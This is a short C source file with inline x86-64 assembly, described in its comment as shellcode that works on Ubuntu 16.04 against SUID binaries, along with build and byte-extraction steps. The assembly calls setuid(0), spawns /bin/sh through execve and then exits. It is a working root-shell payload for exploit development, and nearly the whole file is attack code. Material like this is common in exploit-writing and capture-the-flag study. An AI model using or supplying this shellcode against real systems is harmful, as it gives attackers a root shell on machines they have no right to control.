/*
  shellcode3.c
  This shellcode works on ubuntu 16.04 for suid binaries
  
    $gcc -c -o shellcode3.o shellcode3.c
    $./getcode.sh shellocode3.o > shellcode3.str 
*/

int main(){
__asm(  "xorq %rdi,%rdi\n\t"
        "mov $0x69,%al\n\t"
        "syscall \n\t"
        "xorq   %rdx, %rdx \n\t"
        "movq   $0x68732f6e69622fff,%rbx; \n\t"
        "shr    $0x8, %rbx; \n\t"
        "push   %rbx; \n\t"
        "movq   %rsp,%rdi; \n\t"
        "xorq   %rax,%rax; \n\t"
        "pushq  %rax; \n\t"
        "pushq  %rdi; \n\t"
        "movq   %rsp,%rsi; \n\t"
        "mov    $0x3b,%al; \n\t"
        "syscall ; \n\t"
        "pushq  $0x1 ; \n\t"
        "pop    %rdi ; \n\t"
        "pushq  $0x3c ; \n\t"
        "pop    %rax ; \n\t"
        "syscall  ; \n\t"
);
    return 0;
}
